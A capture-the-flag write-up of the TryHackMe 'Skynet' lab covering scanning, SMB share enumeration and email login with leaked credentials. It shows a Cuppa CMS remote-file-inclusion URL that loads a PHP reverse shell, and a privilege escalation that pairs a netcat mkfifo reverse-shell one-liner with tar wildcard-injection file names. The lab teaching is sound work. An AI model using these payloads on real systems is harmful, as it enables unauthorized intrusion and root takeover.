# [Skynet THM Room](https://tryhackme.com/room/skynet)
## Scanning
### Nmap
```bash
nmap -sC -sV -oN nmapInitial target-ip
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-09-20 13:24 BST
Nmap scan report for ip-10-10-226-33.eu-west-1.compute.internal (target-ip)
Host is up (0.00038s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING AUTH-RESP-CODE SASL TOP UIDL RESP-CODES CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK IDLE IMAP4rev1 ID more have Pre-login LOGIN-REFERRALS ENABLE listed capabilities SASL-IR LITERAL+ post-login LOGINDISABLEDA0001
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:62:22:FF:57:D9 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-09-20T07:24:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-20 13:24:35
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
```

### Gobuster
```bash
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/20 13:29:12 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
===============================================================
2023/09/20 13:29:30 Finished
================================================================
```
## Enumeration
### HTTP
- Some noteworthy directories for enumeration discovered via the [Gobuster](https://github.com/OJ/gobuster) scan are:
	- `/admin`
	- `/ai`
	- `/squirrelmail`
- This machine seems to be hosting both a web server and a mail server, along with other protocols that will be explored in detail below. For now, let's focus on the web server. Navigating to the IP address gives us the following search engine landing page:

![IP Landing Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/c76bd019-1c8a-41fd-b7dc-6d0448eee8e7)



- It doesn't look like the input box processes any user entered data, but they may be something worth exploring later. For now, I want to pivot to the `/admin` directory discovered by our [Gobuster](https://github.com/OJ/gobuster) scan. Unfortunately, it looks like navigating to that page gives us a 403 Forbidden error. With that being said, let's try navigating to the `/ai` directory. We get the same error code. We can then go to the `/squirrelmail` directory, which then gives us a login page:

![SquirrelMail](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/b2244472-4c68-4869-816b-c7d3f20d59dc)


- From here, we can try a few generic things like a username of `admin` and a password of `password`. We can also look around for SquirrelMail default creds online, though looking through some forums and documentation, it seems as though the login information would be the same as credentials authenticated by the IMAP server. Since there aren't any default credentials, we will have to enumerate further. 

### IMAP/POP
- We can try banner grabbing the IMAP server with the  [Netcat](https://nmap.org/ncat/) using the following syntax:
```
nc -nv [ip] 139
```

- This didn't return anything useful, but the methodology is a good practice to follow. More information regarding this can be found in [|HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap). 


### SMB
- We can investigate SMB with [SMBmap](https://github.com/ShawnDEvans/smbmap) and connect to any shares found with [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). To start, we need to list the shares found on the machine with the following syntax:
```
smbmap -H [ip]
```

- This produces the following output:

```python
________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: target-ip:445	Name: ip-10-10-226-33.eu-west-1.compute.internalStatus: Guest session   	
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
```

- Here, we can see that there is an anonymous share that allows read-only access. We can now use [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) to connect to the machine and look at the content of the anonymous share and pull down any relevant files with the `get` command. Looking around, we can see 4 files that we can grab:
	- `log1.txt`
	- `log2.txt`
	- `log3.txt`
	- `attention.txt`

- Contents of `attention.txt`:
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

- Contents of `log1.txt`:
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
- This looks very much like a wordlist we could use when brute forcing login credentials for services like SSH.

- The `log2.txt` and `log3.txt` files both seem to be empty. 
- Using the contents of `log1.txt`, we can create a wordlist and attempt to brute force SSH. Now, we aren't entirely sure of a username at the moment, but we can run this in the background while doing more manual enumeration. Given the information we have found so far, it stands to reason that Miles would be a potential username given what we have uncovered so far. It is also possible that we could use that information to brute force SMB, which seems more likely since there is an SMB share with his name. This didn't provide fruitful though, but isn't extraneous enough to be considered a rabbit hole. 

- With some enumeration based on the TryHackMe guided questions, we can determine that the password for the Miles users email account was, in fact, pulled from the log1.txt wordlist. The password is `cyborg007haloterminator`.

## System Hacking
### Email Login
- Now that we have discovered a password, we can return to SquirrelMail login page and enter in the credentials:
	- Name: milesdyson
	- Password: cyborg007haloterminator
- Once authenticated, we are greeted with the following inbox:

![Miles Inbox](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/fa611fc9-7ea4-4a95-a47b-60dd126d5995)


- When opening up the messages from `serenakogan@skynet`, we see a few messages that effectively say the same thing. However, one is in binary, which can be a little distracting. The output of both messages say something along the lines of:
```


i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```

- However, the message from `skynet@skynet` gives us the following:
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
- This provides us with the proper password to authenticate via SMB, which can grab us the contents of the `milesdyson` share (hopefully).

- Once authenticated, we can see the following files:
```
smb: \> ls
  .                                   D        0  Tue Sep 17 10:05:47 2019
  ..                                  D        0  Wed Sep 18 04:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
  notes                               D        0  Tue Sep 17 10:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019

		9204224 blocks of size 1024. 5809824 blocks available
```

- These files have cool names, but aren't exactly relevant to what we're trying to do. Taking a look in the `/notes` directory, we can see several more files:
```
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 10:18:40 2019
  ..                                  D        0  Tue Sep 17 10:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
  important.txt                       N      117  Tue Sep 17 10:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019

		9204224 blocks of size 1024. 5809824 blocks available
```

- There is a lot here, but the most important (get it?) file we can see is `important.txt`. We can use `get important.txt` to pull down that file. Once we exit out of SMB, we can look at that file. The contents are as follows:
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
- We can see reference to a content management system (CMS) directory called `/45kra24zxs28v3yd`. We can navigate back to our web browser and go to that directory. 

![Dyson Hidden Directory](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/5508bea7-001c-4569-9e17-2a798db2dee1)


- Now that we have uncovered this hidden directory, we can do some more enumeration. The first thing that comes to mind is using [Gobuster](https://github.com/OJ/gobuster) on the new hidden directory to see if there are other places we can go. It stands to reason that there is some sort of administrational or login page since the recovered files reference a content management system. We can use the following syntax, and will get the following output:

```
gobuster dir -u http://target-ip/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip/45kra24zxs28v3yd/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/20 16:20:32 Starting gobuster
===============================================================
/administrator (Status: 301)
===============================================================
2023/09/20 16:20:50 Finished
===============================================================
```

- Our hunch about an administrator page was correct. When we go to this page, we can see the following:

![Hidden Directory CMS Admin Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/9b314134-1c99-4578-a5b9-75bd61bf3a86)


- We are greeted with another login page. I did some research and found that the Cuppa CMS default credentials are admin/admin, but that didn't work. Next, I tried to use the recovered credentials for Miles that allows us to authenticate to SMB, but that didn't work either. 
- After a little googling, we can find that there is an exploit on [Exploit-DB](https://www.exploit-db.com/) that allows for remote file inclusion. We could potentially use this to gain access to the device hosting the CMS. It can be found [here](https://www.exploit-db.com/exploits/25971). 
- Basically, this Remote File Inclusion (RFI) vulnerability can allow us to reference a file hosted on our own webserver and run it, which can run arbitrary commands. To start, we should pull down the [pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell) page. Once we edit it and add the IP address and port of our attacking machine appropriately, we can save it and host it on a local web server using the following syntax:
```python
python3 -m http.server 8887
```
***Note: The port doesn't matter. I only used 8887 because I already set the netcat port to 8888 in the reverse shell script and I didn't want to cause conflicts.***

- Next, we can set up a  [Netcat](https://nmap.org/ncat/) listener on our attacking machine using:
```
nc -lnvp 8888
```

- Now, we can use the following syntax in the URL bar of the web browser to have the target machine pull down and execute our reverse shell script:
```
http://[target ip]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://[attacking ip]:8887/shell.php
```

- If done correctly, we can see that we have a shell on the target machine. From here, we can stabilize it with Python.
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- From this point, we can navigate to the `/home/milesdyson` directory and grab the user flag.

## Privilege Escalation
- Once we grab a shell, we come in as `www-data`. We can switch users to the `milesdyson` user with the syntax `su milesdyson` and entering the password we recovered earlier for his email inbox. 
- Unfortunately, after the `milesdyson` user can't run `sudo` after we run the `sudo -l` command. 
- Doing some further manual enumeration, we can see a `backup.sh` script in the `/home/milesdyson/backup` directory, which may be some way to escalate privileges. This could also be an appropriate time to use something like [LinPEASS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) or [LinEnum](https://github.com/rebootuser/LinEnum) for automated enumeration. 
- After beeping and booping around for a while, we can see that the `backup.sh` files runs every minute via a cron job. I couldn't really figure out how to exploit this, so I had a little help from the walkthrough. The blog that explains the ins and outs of the vulnerability exploitation can be found [here](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com) . 
- Essentially, we can add the following syntax into the `backup.sh` file, set up a [Netcat](https://nmap.org/ncat/) listener, and wait for the cron job to run. Since the cron job runs with root permissions, we should see a root shell spawn.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
- I ran these one at a time in the `/var/www/html` directory, waited for the cron job to happen, then checked permissions again with `sudo -l`. I was given the following output:
```
User www-data may run the following commands on skynet: (root) NOPASSWD: ALL
```
- Now we can use `sudo su` to switch to root, navigate to the `/root` directory and `cat root.txt` to get the root flag.


## Rabbit Holes
### Deleting Comments through Inspector
- When looking at the source code for the Cuppa CMS service, I noticed the following:
```js
<!--
<a class="forgot_password" onclick="ShowPanel('forget')">Forgot Password?</a>
-->
```
- This commented functionality looked like it could be exploitable if the CMS system used client-side code. If I could delete the comment syntax, I could reveal the `Forgot Password?` button, send an email to the compromised inbox that we have access to, then set the password to whatever we want so we could gain further access.

